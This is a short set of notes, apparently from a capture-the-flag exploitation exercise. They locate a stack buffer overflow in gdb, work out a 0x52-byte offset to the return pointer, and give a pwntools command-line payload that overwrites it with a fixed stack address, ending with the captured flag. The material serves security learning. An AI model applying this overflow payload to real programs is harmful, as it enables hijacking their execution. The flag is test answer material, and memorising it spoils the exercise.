[Part 1]
[1.1]
the buffer overflow is located    0x000000000040129b <+133>:	call   0x401110
so we stop after it.
[1.2]
we calculate this as the buffer is of 0x58 away from the return pointer.
We also have to take into account the "Note: " which is 6 characters so 0x58-6 = 0x52
[1.3]
This is in the source and can be found again inside gdb
[1.4]
simple c code to get the env variable we cast it to a void pointer although unimportant

[Part 2]
[2.1]
on the first run we print printf "Byte count: %d\n", $byte_count
printf "Flagcode address: 0x%lx\n", $flagcode_address 
We then place the receieved results into 
run $(python3 -c "import sys; from pwn import *; sys.stdout.buffer.write(b'\x01' * 0x52 + p64(0x7fffffffec97))")
[2.2]
flag{N0Sh3llc0d3Y3t}




